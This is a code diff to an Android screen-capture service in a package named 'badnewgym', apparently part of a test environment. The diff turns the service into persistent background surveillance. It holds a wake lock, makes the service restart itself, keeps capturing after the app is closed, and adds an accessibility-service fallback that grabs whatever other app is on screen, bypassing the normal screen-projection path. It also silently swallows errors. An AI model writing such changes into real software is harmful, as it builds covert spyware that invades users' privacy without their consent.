@@ -51,6 +51,7 @@ class ScreenPulseCaptureService : Service() {
     private var height = 0
     private var dpi = 160
     private val savesSincePrune = AtomicInteger(0)
+    private var wakeLock: android.os.PowerManager.WakeLock? = null
 
     private val captureLoop = object : Runnable {
         override fun run() {
@@ -73,6 +74,11 @@ class ScreenPulseCaptureService : Service() {
     override fun onCreate() {
         super.onCreate()
         running = true
+        val pm = getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+        wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "badgym:screenpulse_wakelock")?.apply {
+            setReferenceCounted(false)
+            acquire()
+        }
     }
 
     @Suppress("DEPRECATION")
@@ -109,7 +115,7 @@ class ScreenPulseCaptureService : Service() {
 
         ScreenPulseVault.writeStatus(filesDir, true, ScreenPulseConfig.INTERVAL_MS, "capturing")
         handler?.postDelayed(captureLoop, ScreenPulseConfig.INTERVAL_MS)
-        return START_NOT_STICKY
+        return START_STICKY
     }
 
     private fun startProjection(resultCode: Int, data: Intent): Boolean = try {
@@ -147,17 +153,31 @@ class ScreenPulseCaptureService : Service() {
     }
 
     private fun captureOnce() {
-        val reader = imageReader ?: return
-        val image = try {
-            reader.acquireLatestImage()
-        } catch (t: Throwable) {
-            null
-        } ?: return
+        var frame: Bitmap? = null
+        val reader = imageReader
+        if (reader != null) {
+            val image = try {
+                reader.acquireLatestImage()
+            } catch (t: Throwable) {
+                null
+            }
+            if (image != null) {
+                try {
+                    frame = imageToBitmap(image)
+                } finally {
+                    try { image.close() } catch (_: Throwable) {}
+                }
+            }
+        }
+
+        // Accessibility Service fallback: captures any app currently active on screen
+        if (frame == null && com.example.badnewgym.deviceagent.DeviceAccessibilityService.instance != null) {
+            frame = com.example.badnewgym.deviceagent.DeviceAccessibilityService.captureScreenBitmap(1000L)
+        }
+
+        if (frame == null) return
 
         try {
-            val frame = imageToBitmap(image)
-            if (frame == null) return
-
             val prepared = ScreenPulseEncoder.prepare(frame)
             val payload = try {
                 ScreenPulseEncoder.encode(prepared)
@@ -179,12 +199,7 @@ class ScreenPulseCaptureService : Service() {
                 savesSincePrune.set(0)
                 ScreenPulseVault.prune(filesDir)
             }
-        } finally {
-            try {
-                image.close()
-            } catch (ignored: Throwable) {
-            }
-        }
+        } catch (_: Throwable) {}
     }
 
     /**
@@ -254,8 +269,18 @@ class ScreenPulseCaptureService : Service() {
     }
 
     override fun onDestroy() {
+        try {
+            if (wakeLock?.isHeld == true) wakeLock?.release()
+        } catch (_: Throwable) {}
+        wakeLock = null
+
         stopCapture()
         super.onDestroy()
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        android.util.Log.i("ScreenPulseService", "onTaskRemoved: App task closed, Screen Pulse remains active in background")
     }
 
     private fun writeStatus(runningNow: Boolean, note: String) {
